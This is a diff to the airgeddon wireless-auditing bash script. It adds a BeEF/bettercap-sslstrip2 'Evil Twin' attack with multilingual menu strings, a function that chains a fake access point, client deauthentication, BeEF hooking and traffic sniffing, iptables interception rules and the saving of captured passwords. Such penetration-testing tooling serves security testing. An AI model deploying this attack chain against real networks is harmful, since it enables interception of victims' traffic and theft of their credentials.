+	arr["ENGLISH",407]="BeEF preparation"
+	arr["SPANISH",407]="Preparación BeEF"
+	arr["FRENCH",407]="${pending_of_translation} Préparation BeEF"
+	arr["CATALAN",407]="Preparació BeEF"
+	arr["PORTUGUESE",407]="Preparando BeEF"
+	arr["RUSSIAN",407]="Подготовка BeEF"
+	arr["GREEK",407]="Προετοιμασία του BeEF"
+
+	arr["ENGLISH",408]="If you installed BeEF manually, airgeddon might not be able to find it and the attack option can appear as restricted. You can try to solve it using the special menu option to fix this. It will work only if BeEF is already correctly installed and your unique problem is the script is not detecting it"
+	arr["SPANISH",408]="Si instalaste BeEF manualmente, puede que airgeddon no sea capaz de encontrarlo y la opción del ataque te aparezca restringida. Puedes intentar solucionarlo usando la opción del menú especial para ello. Esto sólo funcionará si BeEF ya está instalado correctamente y el único problema que tienes es que el script no lo detecta"
+	arr["FRENCH",408]="Si BeEF a été installé manuellement, il se peut qu'airgeddon ne soit pas en mesure de le trouver. L'option dédiée ne sera pas accessible. Vous pouvez essayer de la réparer en utilisant l'option consacrée à cette tâche depuis le menu spécial. Ça ne marchera que si BeEf est correctement instalé et c'est le script qui n'est pas capable de le détecter"
+	arr["CATALAN",408]="Si vas instal·lar BeEF manualment, pot ser que airgeddon no sigui capaç de trobar-lo i l'opció de l'atac t'aparegui restringida. Pots intentar solucionar usant l'opció del menú especial per a això. Això només funcionarà si BeEF ja està instal·lat correctament i l'únic problema que tens és que el script no el detecta"
+	arr["PORTUGUESE",408]="Se BeEF foi instalado manualmente, o airgeddon não  pode encontrá-lo automaticamente e a opção de ataque aparecerá bloqueada. Você pode tentar corrigi-lo usando a opção de menu especial para isso. Isso só vai funcionar se BeEF já está instalado com êxito e o único problema que você tem é que o script não o detecta"
+	arr["RUSSIAN",408]="Если вы установили BeEF вручную, airgeddon может быть не в состоянии найти его, и опция атаки в меню может быть ограничена. Для исправления этого, вы можете попытаться решить эту проблему с помощью специального пункта меню. Это сработает только если BeEF уже правильно установлен, и ваша единственная проблема в том, что скрипт не обнаруживает его"
+	arr["GREEK",408]="Εάν έχετε εγκαταστήσει χειροκίνητα το BeEF, το airgeddon μπορεί να μην μπορέσει να το βρεί και η επιλογή της επίθεσης μπορεί να φανεί σαν περιορισμένη. Μπορείτε να προσπαθήσετε να διορθώσετε το πρόβλημα κάνοντας χρήση της ειδικής επιλογής στο μενού. Θα λειτουργήσει μόνο αν το BeEF έχει ήδη εγκατασταθεί σωστά και το μόνο πρόβλημα είναι ότι το script δεν το εντοπίζει"
+
+	arr["ENGLISH",409]="1.  Evil Twin AP attack with sniffing and bettercap-sslstrip2/BeEF"
+	arr["SPANISH",409]="1.  Ataque Evil Twin AP con sniffing y bettercap-sslstrip2/BeEF"
+	arr["FRENCH",409]="1.  Attaque Evil Twin avec capture des données et bettercap-sslstrip2/BeEF"
+	arr["CATALAN",409]="1.  Atac Evil Twin AP amb sniffing i bettercap-sslstrip2/BeEF"
+	arr["PORTUGUESE",409]="1.  Ataque Evil Twin AP com sniffing e bettercap-sslstrip2/BeEF"
+	arr["RUSSIAN",409]="1.  Атака Злой Двойник ТД со сниффингом и bettercap-sslstrip2/BeEF"
+	arr["GREEK",409]="1.  Επίθεση Evil Twin AP με sniffing και bettercap-sslstrip2/BeEF"
+
+	arr["ENGLISH",410]="2.  Try to troubleshoot manually installed BeEF dependency problem"
+	arr["SPANISH",410]="2.  Intentar solucionar problema de dependencia BeEF instalado manualmente"
+	arr["FRENCH",410]="2.  Essayez de résoudre le problème BeEF installé manuellement"
+	arr["CATALAN",410]="2.  Intentar solucionar problema de dependència BeEF instal·lat manualment"
+	arr["PORTUGUESE",410]="2.  Tente resolver o problema de dependência do BeEF instalado manualmente"
+	arr["RUSSIAN",410]="2.  Попробуйте устранить проблему вручную установив зависимости BeEF"
+	arr["GREEK",410]="2.  Προσπαθήστε να αντιμετωπίσετε το πρόβλημα με τα dependencies του χειροκίνητα εγκατεστημένου BeEF"
+
+	arr["ENGLISH",411]="3.  Return to Evil Twin attacks menu"
+	arr["SPANISH",411]="3.  Volver al menú de ataques Evil Twin"
+	arr["FRENCH",411]="3.  Retour au menu d'attaques Evil Twin"
+	arr["CATALAN",411]="3.  Tornar al menú d'atacs Evil Twin"
+	arr["PORTUGUESE",411]="3.  Voltar ao menu de ataques Evil Twin"
+	arr["RUSSIAN",411]="3.  Вернуться в меню атак Злой Двойник"
+	arr["GREEK",411]="3.  Επιστροφή στο μενού επιθέσεων Evil Twin"
+
+	arr["ENGLISH",412]="You don't need to perform this action. Your BeEF is operational"
+	arr["SPANISH",412]="No necesitas realizar esta acción. Tu BeEF está operativo"
+	arr["FRENCH",412]="Vous n'êtes pas obligé de le faire. BeEF est opérationnel"
+	arr["CATALAN",412]="No necessites realitzar aquesta acció. El teu BeEF està operatiu"
+	arr["PORTUGUESE",412]="Você não precisa fazer isso. Seu BeEF está operacional"
+	arr["RUSSIAN",412]="Вам не нужно выполнять это действие. Ваш BeEF находится в рабочем состоянии"
+	arr["GREEK",412]="Δεν χρειάζεται να εκτελέσετε αυτήν την ενέργεια. Το BeEF λειτουργεί κανονικά"
+
+	arr["ENGLISH",413]="airgeddon fixed the problem. Your BeEF is operational"
+	arr["SPANISH",413]="airgeddon ha solucionado el problema. Tu BeEF está operativo"
+	arr["FRENCH",413]="airgeddon a résolu le problème. BeEF est opérationnel"
+	arr["CATALAN",413]="airgeddon ha solucionat el problema. El teu BeEF està operatiu"
+	arr["PORTUGUESE",413]="O airgeddon corrigiu o problema. Seu BeEF está operacional"
+	arr["RUSSIAN",413]="airgeddon устранил проблему. Ваш BeEF находится в рабочем состоянии"
+	arr["GREEK",413]="Το airgeddon διόρθωσε το πρόβλημα. Το BeEF λειτουργεί κανονικά"
+
+	arr["ENGLISH",414]="You don't have curl installed. Is not possible to download PINs database file"
+	arr["SPANISH",414]="No tienes curl instalado. No se puede descargar el fichero de la base de datos de PINs"
+	arr["FRENCH",414]="Curl n'est pas installé. Vous ne pouvez pas télécharger le fichier de la base de donées PIN"
+	arr["CATALAN",414]="No tens curl instal·lat. No es pot descarregar el fitxer de la base de dades de PINs"
+	arr["PORTUGUESE",414]="Você não tem o pacote curl instalado. Você não pode baixar o arquivo de banco de dados de PINs"
+	arr["RUSSIAN",414]="У вас не установлен curl. Невозможно загрузить файл базы данных PIN"
+	arr["GREEK",414]="Το curl δεν είναι εγκατεστημένο. Είναι αδύνατον να κατέβει το αρχείο με την βάση δεδομένων PIN"
+
+	arr["ENGLISH",415]="${blue_color}airgeddon knows you have BeEF installed and you pass the validation, but it was unable to locate the right directory path where you have BeEF installed. Knowing the location gives some advantages for the execution because its configuration file can be customized instead of generic. ${green_color}Do you want to enter it manually? ${normal_color}[y/n]"
+	arr["SPANISH",415]="${blue_color}airgeddon sabe que tienes BeEF instalado y pasas la validación, pero no ha podido concretar la ruta del directorio exacto donde tienes instalado BeEF. Conocer la localización exacta tiene algunas ventajas a la hora de ejecutarlo ya que la configuración será personalizada en lugar de ser una configuración genérica. ${green_color}¿Quieres introducirla manualmente? ${normal_color}[y/n]"
+	arr["FRENCH",415]="${pending_of_translation} ${blue_color}airgeddon sait que vous avez installé BeEF et les raisins secs validation, mais n'a pas pu indiquer le chemin exact du répertoire où vous avez installé BeEF. Connaître l'emplacement exact a certains avantages lors de l'exécution depuis la configuration sera personnalisée plutôt qu'une configuration générique. ${green_color}Voulez-vous entrer manuellement? ${normal_color}[y/n]"
+	arr["CATALAN",415]="${blue_color}airgeddon sap que tens BeEF instal·lat i passes la validació, però no ha pogut concretar la ruta del directori exacte on has instal·lat BeEF. Conèixer la localització exacta té alguns avantatges a l'hora d'executar ja que la configuració serà personalitzada en lloc de ser una configuració genèrica. ${green_color}¿Vols introduir-la manualment? ${normal_color}[y/n]"
+	arr["PORTUGUESE",415]="${blue_color}O airgeddon sabe que você instalou o BeEF e validou a instalacão, mas não pôde encontrar o caminho exato do diretório onde você instalou BeEF. Sabendo a localização exata tem algumas vantagens quando executá-lo a configuração será personalizada em vez de uma configuração genérica. ${green_color}Você quer inseri-lo manualmente? ${normal_color}[y/n]"
+	arr["RUSSIAN",415]="${blue_color}airgeddon знает, что у вас установлен BeEF и вы успешно прошли проверку, но скрипт оказался не в состоянии найти правильный путь к каталогу, где вы установили BeEF. Знание расположения даёт некоторые преимущества при выполнении, поскольку появляется возможность настроить его конфигурационный файл, а не использовать настройки по умолчанию. ${green_color}Вы хотите ввести расположение вручную? ${normal_color}[y/n]"
+	arr["GREEK",415]="${blue_color}Το airgeddon γνωρίζει ότι έχετε εγκατεστημένο το BeEF και έχετε περάσει τους απαραίτητους ελέγχους, αλλά δεν μπόρεσε να εντοπίσει το σωστό μονοπάτι για τον κατάλογο όπου έχετε εγκαταστήσει το BeEF. Γνωρίζοντας το μονοπάτι για τον κατάλογο κάνει την διαδικασία της εκτέλεσης πλεονεκτική γιατί το αρχείο παραμέτρων μπορεί να ρυθμιστεί καταλλήλως, αντιθέτως με το προεπιλεγμένο. ${green_color}Θέλετε να το εισάγετε χειροκίνητα; ${normal_color}[y/n]"
+
+	arr["ENGLISH",416]="    You can run BeEF, but it is better if you run the second option before"
+	arr["SPANISH",416]="    Puedes ejecutar BeEF, pero es recomendable ejecutar la segunda opción antes"
+	arr["FRENCH",416]="${pending_of_translation}     Vous pouvez exécuter BeEF, mais il est recommandé d'exécuter la deuxième option de menu avant"
+	arr["CATALAN",416]="    Pots executar BeEF, però és recomanable executar la segona opció del menú abans"
+	arr["PORTUGUESE",416]="    Você pode executar BeEF, mas é recomendado executar a segunda opção de menu antes"
+	arr["RUSSIAN",416]="    Вы можете запустить BeEF, но лучше, если вы сначала запустите вторую опцию"
+	arr["GREEK",416]="    Μπορείτε να εκτελέσετε το BeEF, αλλά είναι καλύτερα να διαλέξετε τη δεύτερη επιλογή από πριν"
+
 	case "${3}" in
 		"yellow")
 			interrupt_checkpoint "${2}" "${3}"
@@ -3703,6 +3901,9 @@ function language_strings() {
 		;;
 		"separator")
 			generate_dynamic_line "${arr[${1},${2}]}" "separator"
+		;;
+		"warning")
+			echo_yellow "${arr[${1},${2}]}"
 		;;
 		"under_construction")
 			echo_red_slim "${arr[${1},${2}]} (${under_constructionvar})"
@@ -3795,7 +3996,7 @@ function generate_dynamic_line() {
 	fi
 
 	if [ "${type}" = "title" ]; then
-		echo_red "${finaltitle}"
+		echo_green_title "${finaltitle}"
 	elif [ "${type}" = "separator" ]; then
 		echo_blue "${finaltitle}"
 	fi
@@ -3808,13 +4009,13 @@ function check_to_set_managed() {
 	case "${ifacemode}" in
 		"Managed")
 			echo
-			language_strings "${language}" 0 "yellow"
+			language_strings "${language}" 0 "red"
 			language_strings "${language}" 115 "read"
 			return 1
 		;;
 		"(Non wifi card)")
 			echo
-			language_strings "${language}" 1 "yellow"
+			language_strings "${language}" 1 "red"
 			language_strings "${language}" 115 "read"
 			return 1
 		;;
@@ -3829,13 +4030,13 @@ function check_to_set_monitor() {
 	case "${ifacemode}" in
 		"Monitor")
 			echo
-			language_strings "${language}" 10 "yellow"
+			language_strings "${language}" 10 "red"
 			language_strings "${language}" 115 "read"
 			return 1
 		;;
 		"(Non wifi card)")
 			echo
-			language_strings "${language}" 13 "yellow"
+			language_strings "${language}" 13 "red"
 			language_strings "${language}" 115 "read"
 			return 1
 		;;
@@ -3850,7 +4051,7 @@ function check_monitor_enabled() {
 
 	if [[ ${mode} != "Monitor" ]]; then
 		echo
-		language_strings "${language}" 14 "yellow"
+		language_strings "${language}" 14 "red"
 		language_strings "${language}" 115 "read"
 		return 1
 	fi
@@ -4180,7 +4381,7 @@ function monitor_option() {
 
 	if [ "$?" != "0" ]; then
 		echo
-		language_strings "${language}" 20 "yellow"
+		language_strings "${language}" 20 "red"
 		language_strings "${language}" 115 "read"
 		return
 	fi
@@ -4232,7 +4433,7 @@ function check_interface_mode() {
 		return 0
 	fi
 
-	language_strings "${language}" 23 "yellow"
+	language_strings "${language}" 23 "red"
 	language_strings "${language}" 115 "read"
 	exit_code=1
 	exit_script_option
@@ -4262,7 +4463,7 @@ function language_menu() {
 	case ${language_selected} in
 		1)
 			if [ "${language}" = "ENGLISH" ]; then
-				language_strings "${language}" 251 "yellow"
+				language_strings "${language}" 251 "red"
 			else
 				language="ENGLISH"
 				language_strings "${language}" 83 "yellow"
@@ -4271,7 +4472,7 @@ function language_menu() {
 		;;
 		2)
 			if [ "${language}" = "SPANISH" ]; then
-				language_strings "${language}" 251 "yellow"
+				language_strings "${language}" 251 "red"
 			else
 				language="SPANISH"
 				language_strings "${language}" 84 "yellow"
@@ -4280,7 +4481,7 @@ function language_menu() {
 		;;
 		3)
 			if [ "${language}" = "FRENCH" ]; then
-				language_strings "${language}" 251 "yellow"
+				language_strings "${language}" 251 "red"
 			else
 				language="FRENCH"
 				language_strings "${language}" 112 "yellow"
@@ -4289,7 +4490,7 @@ function language_menu() {
 		;;
 		4)
 			if [ "${language}" = "CATALAN" ]; then
-				language_strings "${language}" 251 "yellow"
+				language_strings "${language}" 251 "red"
 			else
 				language="CATALAN"
 				language_strings "${language}" 117 "yellow"
@@ -4298,7 +4499,7 @@ function language_menu() {
 		;;
 		5)
 			if [ "${language}" = "PORTUGUESE" ]; then
-				language_strings "${language}" 251 "yellow"
+				language_strings "${language}" 251 "red"
 			else
 				language="PORTUGUESE"
 				language_strings "${language}" 248 "yellow"
@@ -4307,7 +4508,7 @@ function language_menu() {
 		;;
 		6)
 			if [ "${language}" = "RUSSIAN" ]; then
-				language_strings "${language}" 251 "yellow"
+				language_strings "${language}" 251 "red"
 			else
 				language="RUSSIAN"
 				language_strings "${language}" 307 "yellow"
@@ -4316,7 +4517,7 @@ function language_menu() {
 		;;
 		7)
 			if [ "${language}" = "GREEK" ]; then
-				language_strings "${language}" 251 "yellow"
+				language_strings "${language}" 251 "red"
 			else
 				language="GREEK"
 				language_strings "${language}" 332 "yellow"
@@ -4394,6 +4595,9 @@ function select_internet_interface() {
 		"et_sniffing_sslstrip")
 			language_strings "${language}" 292 "title"
 		;;
+		"et_sniffing_sslstrip2")
+			language_strings "${language}" 397 "title"
+		;;
 		"et_captive_portal")
 			language_strings "${language}" 293 "title"
 		;;
@@ -4426,8 +4630,9 @@ function select_internet_interface() {
 
 	if [ ${option_counter} -eq 0 ]; then
 		return_to_et_main_menu=1
+		return_to_et_main_menu_from_beef=1
 		echo
-		language_strings "${language}" 280 "yellow"
+		language_strings "${language}" 280 "red"
 		language_strings "${language}" 115 "read"
 		return 1
 	fi
@@ -4447,6 +4652,7 @@ function select_internet_interface() {
 		invalid_internet_iface_selected
 	elif [ "${inet_iface}" -eq ${option_counter_back} ]; then
 		return_to_et_main_menu=1
+		return_to_et_main_menu_from_beef=1
 		return 1
 	else
 		option_counter2=0
@@ -5056,7 +5262,7 @@ function wps_attacks_parameters() {
 function print_iface_selected() {
 
 	if [ -z "${interface}" ]; then
-		language_strings "${language}" 41 "blue"
+		language_strings "${language}" 41 "red"
 		echo
 		language_strings "${language}" 115 "read"
 		select_interface
@@ -5244,6 +5450,33 @@ function initialize_menu_options_dependencies() {
 	bully_attacks_dependencies=(${optional_tools_names[15]} ${optional_tools_names[17]})
 	bully_pixie_dust_attack_dependencies=(${optional_tools_names[15]} ${optional_tools_names[16]} ${optional_tools_names[17]})
 	reaver_pixie_dust_attack_dependencies=(${optional_tools_names[14]} ${optional_tools_names[16]})
+	et_sniffing_sslstrip2_dependencies=(${optional_tools_names[5]} ${optional_tools_names[6]} ${optional_tools_names[7]} ${optional_tools_names[18]} ${optional_tools_names[19]})
+}
+
+#Set possible changes for some commands that can be found in different ways depending of the O.S.
+function set_possible_aliases() {
+
+	for item in "${!possible_alias_names[@]}"; do
+		if ! hash "${item}" 2> /dev/null || [[ "${item}" = "beef" ]]; then
+			arraliases=(${possible_alias_names[${item//[[:space:]]/ }]})
+			for item2 in "${arraliases[@]}"; do
+				if hash "${item2}" 2> /dev/null; then
+					optional_tools_names=(${optional_tools_names[@]/${item}/${item2}})
+					break
+				fi
+			done
+		fi
+	done
+}
+
+#Initialize optional_tools values
+function initialize_optional_tools_values() {
+
+	declare -gA optional_tools=()
+
+	for item in "${optional_tools_names[@]}"; do
+		optional_tools[${item}]=0
+	done
 }
 
 #Set some vars depending of the menu and invoke the printing of target vars
@@ -5276,6 +5509,7 @@ function initialize_menu_and_print_selections() {
 		"evil_twin_attacks_menu")
 			return_to_et_main_menu=0
 			retry_handshake_capture=0
+			return_to_et_main_menu_from_beef=0
 			retrying_handshake_capture=0
 			internet_interface_selected=0
 			captive_portal_mode="internet"
@@ -5296,6 +5530,10 @@ function initialize_menu_and_print_selections() {
 		"wps_attacks_menu")
 			print_iface_selected
 			print_all_target_vars_wps
+		;;
+		"beef_pre_menu")
+			print_iface_selected
+			print_all_target_vars_et
 		;;
 		*)
 			print_iface_selected
@@ -5318,6 +5556,11 @@ function clean_tmpfiles() {
 	rm -rf "${tmpdir}${control_file}" > /dev/null 2>&1
 	rm -rf "${tmpdir}parsed_file" > /dev/null 2>&1
 	rm -rf "${tmpdir}${ettercap_file}"* > /dev/null 2>&1
+	rm -rf "${tmpdir}${bettercap_file}"* > /dev/null 2>&1
+	rm -rf "${tmpdir}${beef_file}" > /dev/null 2>&1
+	if [ "${beef_found}" -eq 1 ]; then
+		rm -rf "${beef_path}${beef_file}" > /dev/null 2>&1
+	fi
 	rm -rf "${tmpdir}${sslstrip_file}" > /dev/null 2>&1
 	rm -rf "${tmpdir}${webserver_file}" > /dev/null 2>&1
 	rm -rf -R "${tmpdir}${webdir}" > /dev/null 2>&1
@@ -5329,12 +5572,18 @@ function clean_tmpfiles() {
 	rm -rf "${tmpdir}${wps_out_file}" > /dev/null 2>&1
 }
 
-#Clean firewall rules and restore orginal routing state
+#Manage cleaning firewall rules and restore orginal routing state
 function clean_routing_rules() {
 
 	if [ -n "${original_routing_state}" ]; then
 		echo "${original_routing_state}" > /proc/sys/net/ipv4/ip_forward
 	fi
+
+	clean_iptables
+}
+
+#Clean iptables rules
+function clean_iptables() {
 
 	iptables -F
 	iptables -t nat -F
@@ -5437,6 +5686,13 @@ function print_hint() {
 			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
 			strtoprint=${hints[wps_hints|${randomhint}]}
 		;;
+		"beef_pre_menu")
+			store_array hints beef_hints "${beef_hints[@]}"
+			hintlength=${#beef_hints[@]}
+			((hintlength--))
+			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
+			strtoprint=${hints[beef_hints|${randomhint}]}
+		;;
 	esac
 
 	print_simple_separator
@@ -5444,7 +5700,7 @@ function print_hint() {
 	print_simple_separator
 }
 
-#Airgeddon main menu
+#airgeddon main menu
 function main_menu() {
 
 	clear
@@ -5531,6 +5787,7 @@ function evil_twin_attacks_menu() {
 	language_strings "${language}" 257 "separator"
 	language_strings "${language}" 259 et_sniffing_dependencies[@]
 	language_strings "${language}" 261 et_sniffing_sslstrip_dependencies[@]
+	language_strings "${language}" 396
 	language_strings "${language}" 262 "separator"
 	language_strings "${language}" 263 et_captive_portal_dependencies[@]
 	print_simple_separator
@@ -5562,7 +5819,7 @@ function evil_twin_attacks_menu() {
 					et_dos_menu
 				else
 					echo
-					language_strings "${language}" 281 "yellow"
+					language_strings "${language}" 281 "red"
 					language_strings "${language}" 115 "read"
 				fi
 			fi
@@ -5578,7 +5835,7 @@ function evil_twin_attacks_menu() {
 					et_dos_menu
 				else
 					echo
-					language_strings "${language}" 281 "yellow"
+					language_strings "${language}" 281 "red"
 					language_strings "${language}" 115 "read"
 				fi
 			fi
@@ -5594,12 +5851,15 @@ function evil_twin_attacks_menu() {
 					et_dos_menu
 				else
 					echo
-					language_strings "${language}" 281 "yellow"
+					language_strings "${language}" 281 "red"
 					language_strings "${language}" 115 "read"
 				fi
 			fi
 		;;
 		8)
+			beef_pre_menu
+		;;
+		9)
 			contains_element "${et_option}" "${forbidden_options[@]}"
 			if [ "$?" = "0" ]; then
 				forbidden_menu_option
@@ -5617,12 +5877,12 @@ function evil_twin_attacks_menu() {
 					fi
 				else
 					echo
-					language_strings "${language}" 281 "yellow"
+					language_strings "${language}" 281 "red"
 					language_strings "${language}" 115 "read"
 				fi
 			fi
 		;;
-		9)
+		10)
 			return
 		;;
 		*)
@@ -5631,6 +5891,79 @@ function evil_twin_attacks_menu() {
 	esac
 
 	evil_twin_attacks_menu
+}
+
+#beef pre attack menu
+function beef_pre_menu() {
+
+	if [ ${return_to_et_main_menu_from_beef} -eq 1 ]; then
+		return
+	fi
+
+	search_for_beef
+
+	clear
+	language_strings "${language}" 407 "title"
+	current_menu="beef_pre_menu"
+	initialize_menu_and_print_selections
+	echo
+	language_strings "${language}" 47 "green"
+	print_simple_separator
+
+	if [[ "${beef_found}" -eq 0 ]] && [[ ${optional_tools[${optional_tools_names[19]}]} -eq 1 ]]; then
+		if [[ ${optional_tools[${optional_tools_names[5]}]} -eq 1 ]] && [[ ${optional_tools[${optional_tools_names[6]}]} -eq 1 ]] && [[ ${optional_tools[${optional_tools_names[7]}]} -eq 1 ]] && [[ ${optional_tools[${optional_tools_names[18]}]} -eq 1 ]]; then
+			language_strings "${language}" 409 "warning"
+			language_strings "${language}" 416 "pink"
+		else
+			language_strings "${language}" 409 et_sniffing_sslstrip2_dependencies[@]
+		fi
+	else
+		language_strings "${language}" 409 et_sniffing_sslstrip2_dependencies[@]
+	fi
+
+	print_simple_separator
+	language_strings "${language}" 410
+	print_simple_separator
+	language_strings "${language}" 411
+	print_hint ${current_menu}
+
+	read -r beef_option
+	case ${beef_option} in
+		1)
+			contains_element "${beef_option}" "${forbidden_options[@]}"
+			if [ "$?" = "0" ]; then
+				forbidden_menu_option
+			else
+				check_interface_wifi
+				if [ "$?" = "0" ]; then
+					et_mode="et_sniffing_sslstrip2"
+					get_bettercap_version
+					et_dos_menu
+				else
+					echo
+					language_strings "${language}" 281 "red"
+					language_strings "${language}" 115 "read"
+				fi
+			fi
+		;;
+		2)
+			if [[ "${beef_found}" -eq 1 ]] && [[ ${optional_tools[${optional_tools_names[19]}]} -eq 1 ]]; then
+				echo
+				language_strings "${language}" 412 "red"
+				language_strings "${language}" 115 "read"
+			else
+				prepare_beef_start
+			fi
+		;;
+		3)
+			return
+		;;
+		*)
+			invalid_menu_option
+		;;
+	esac
+
+	beef_pre_menu
 }
 
 #WPS attacks menu
@@ -5724,7 +6057,7 @@ function wps_attacks_menu() {
 					fi
 				else
 					echo
-					language_strings "${language}" 367 "yellow"
+					language_strings "${language}" 367 "red"
 					language_strings "${language}" 115 "read"
 				fi
 			fi
@@ -5747,7 +6080,7 @@ function wps_attacks_menu() {
 					fi
 				else
 					echo
-					language_strings "${language}" 371 "yellow"
+					language_strings "${language}" 371 "red"
 					language_strings "${language}" 115 "read"
 				fi
 			fi
@@ -5787,10 +6120,9 @@ function wps_attacks_menu() {
 				wps_attack="pindb_bully"
 				get_bully_version
 				set_bully_verbosity
-				if [ -z "${scriptfolder}" ]; then
-					set_script_folder_and_name
-				fi
+				set_script_folder_and_name
 
+				db_error=0
 				if [[ ${pin_dbfile_checked} -eq 0 ]] || [[ ! -f "${scriptfolder}${known_pins_dbfile}" ]]; then
 					check_pins_database_file
 					if [ "$?" = "0" ]; then
@@ -5798,16 +6130,20 @@ function wps_attacks_menu() {
 						language_strings "${language}" 373 "blue"
 					else
 						echo
-						language_strings "${language}" 372 "yellow"
+						language_strings "${language}" 372 "red"
+						db_error=1
 					fi
 				else
 					echo
 					language_strings "${language}" 379 "blue"
 				fi
 				language_strings "${language}" 115 "read"
-				wps_attacks_parameters
-				if [ "$?" = "0" ]; then
-					exec_wps_pin_database_bully_attack
+
+				if [ "${db_error}" -eq 0 ]; then
+					wps_attacks_parameters
+					if [ "$?" = "0" ]; then
+						exec_wps_pin_database_bully_attack
+					fi
 				fi
 			fi
 		;;
@@ -5818,10 +6154,9 @@ function wps_attacks_menu() {
 			else
 				wps_attack="pindb_reaver"
 				get_reaver_version
-				if [ -z "${scriptfolder}" ]; then
-					set_script_folder_and_name
-				fi
+				set_script_folder_and_name
 
+				db_error=0
 				if [[ ${pin_dbfile_checked} -eq 0 ]] || [[ ! -f "${scriptfolder}${known_pins_dbfile}" ]]; then
 					check_pins_database_file
 					if [ "$?" = "0" ]; then
@@ -5829,16 +6164,19 @@ function wps_attacks_menu() {
 						language_strings "${language}" 373 "blue"
 					else
 						echo
-						language_strings "${language}" 372 "yellow"
+						language_strings "${language}" 372 "red"
+						db_error=1
 					fi
 				else
 					echo
 					language_strings "${language}" 379 "blue"
 				fi
 				language_strings "${language}" 115 "read"
-				wps_attacks_parameters
-				if [ "$?" = "0" ]; then
-					exec_wps_pin_database_reaver_attack
+				if [ "${db_error}" -eq 0 ]; then
+					wps_attacks_parameters
+					if [ "$?" = "0" ]; then
+						exec_wps_pin_database_reaver_attack
+					fi
 				fi
 			fi
 		;;
@@ -6048,10 +6386,10 @@ function check_bssid_in_captured_file() {
 	echo
 	if [ "${nets_from_file}" = "" ]; then
 		if [ ! -f "${1}" ]; then
-			language_strings "${language}" 161 "yellow"
+			language_strings "${language}" 161 "red"
 			language_strings "${language}" 115 "read"
 		else
-			language_strings "${language}" 216 "yellow"
+			language_strings "${language}" 216 "red"
 			language_strings "${language}" 115 "read"
 		fi
 		return 1
@@ -6073,7 +6411,7 @@ function check_bssid_in_captured_file() {
 		fi
 	done
 
-	language_strings "${language}" 323 "yellow"
+	language_strings "${language}" 323 "red"
 	language_strings "${language}" 115 "read"
 	return 1
 }
@@ -6085,7 +6423,7 @@ function select_wpa_bssid_target_from_captured_file() {
 
 	echo
 	if [ "${nets_from_file}" = "" ]; then
-		language_strings "${language}" 216 "yellow"
+		language_strings "${language}" 216 "red"
 		language_strings "${language}" 115 "read"
 		return 1
 	fi
@@ -6320,6 +6658,29 @@ function manage_ettercap_log() {
 		validpath=1
 		while [[ "${validpath}" != "0" ]]; do
 			read_path "ettercaplog"
+		done
+	fi
+}
+
+#Check if the passwords were captured using bettercap and manage to save them on a file
+function manage_bettercap_log() {
+
+	bettercap_log=0
+	ask_yesno 302
+	if [ ${yesno} = "y" ]; then
+		bettercap_log=1
+		default_bettercap_logpath=$(env | grep ^HOME | awk -F = '{print $2}')
+		lastcharbettercaplogpath=${default_bettercap_logpath: -1}
+		if [ "${lastcharbettercaplogpath}" != "/" ]; then
+			bettercap_logpath="${default_bettercap_logpath}/"
+		fi
+		default_bettercaplogfilename="evil_twin_captured_passwords-bettercap-${essid}.txt"
+		rm -rf "${tmpdir}${bettercap_file}"* > /dev/null 2>&1
+		tmp_bettercaplog="${tmpdir}${bettercap_file}"
+		default_bettercap_logpath="${bettercap_logpath}${default_bettercaplogfilename}"
+		validpath=1
+		while [[ "${validpath}" != "0" ]]; do
+			read_path "bettercaplog"
 		done
 	fi
 }
@@ -6619,7 +6980,7 @@ function exec_et_sniffing_attack() {
 	set_std_internet_routing_rules
 	launch_dhcp_server
 	exec_et_deauth
-	launch_sniffing
+	launch_ettercap_sniffing
 	set_control_script
 	launch_control_window
 
@@ -6645,7 +7006,7 @@ function exec_et_sniffing_sslstrip_attack() {
 	launch_dhcp_server
 	exec_et_deauth
 	launch_sslstrip
-	launch_sniffing
+	launch_ettercap_sniffing
 	set_control_script
 	launch_control_window
 
@@ -6657,6 +7018,42 @@ function exec_et_sniffing_sslstrip_attack() {
 	restore_et_interface
 	if [ ${ettercap_log} -eq 1 ]; then
 		parse_ettercap_log
+	fi
+	clean_tmpfiles
+}
+
+#Execute Evil Twin with sniffing+bettercap-sslstrip2/beef attack
+function exec_et_sniffing_sslstrip2_attack() {
+
+	set_hostapd_config
+	launch_fake_ap
+	set_dhcp_config
+	set_std_internet_routing_rules
+	launch_dhcp_server
+	exec_et_deauth
+	if [ "${beef_found}" -eq 1 ]; then
+		set_beef_config
+	else
+		new_beef_pass="beef"
+		et_misc_texts[${language},27]=${et_misc_texts[${language},27]/${beef_pass}/${new_beef_pass}}
+		beef_pass="${new_beef_pass}"
+
+	fi
+	launch_beef
+	launch_bettercap_sniffing
+	set_control_script
+	launch_control_window
+
+	echo
+	language_strings "${language}" 298 "yellow"
+	language_strings "${language}" 115 "read"
+
+	kill_beef
+	kill_et_windows
+	restore_et_interface
+
+	if [ ${bettercap_log} -eq 1 ]; then
+		parse_bettercap_log
 	fi
 	clean_tmpfiles
 }
@@ -6719,7 +7116,7 @@ function launch_fake_ap() {
 		"et_onlyap")
 			hostapd_scr_window_position=${g1_topleft_window}
 		;;
-		"et_sniffing"|"et_captive_portal")
+		"et_sniffing"|"et_captive_portal"|"et_sniffing_sslstrip2")
 			hostapd_scr_window_position=${g3_topleft_window}
 		;;
 		"et_sniffing_sslstrip")
@@ -6819,10 +7216,7 @@ function set_std_internet_routing_rules() {
 	original_routing_state=$(cat /proc/sys/net/ipv4/ip_forward)
 	ifconfig "${interface}" ${et_ip_router} netmask ${std_c_mask} > /dev/null 2>&1
 
-	iptables -F
-	iptables -t nat -F
-	iptables -X
-	iptables -t nat -X
+	clean_iptables
 
 	if [[ "${et_mode}" != "et_captive_portal" ]] || [[ ${captive_portal_mode} = "internet" ]]; then
 		iptables -P FORWARD ACCEPT
@@ -6843,6 +7237,11 @@ function set_std_internet_routing_rules() {
 	elif [ "${et_mode}" = "et_sniffing_sslstrip" ]; then
 		iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port ${sslstrip_port}
 		iptables -A INPUT -p tcp --destination-port ${sslstrip_port} -j ACCEPT
+	elif [ "${et_mode}" = "et_sniffing_sslstrip2" ]; then
+		iptables -A INPUT -p tcp --destination-port ${bettercap_proxy_port} -j ACCEPT
+		iptables -A INPUT -p udp --destination-port ${bettercap_dns_port} -j ACCEPT
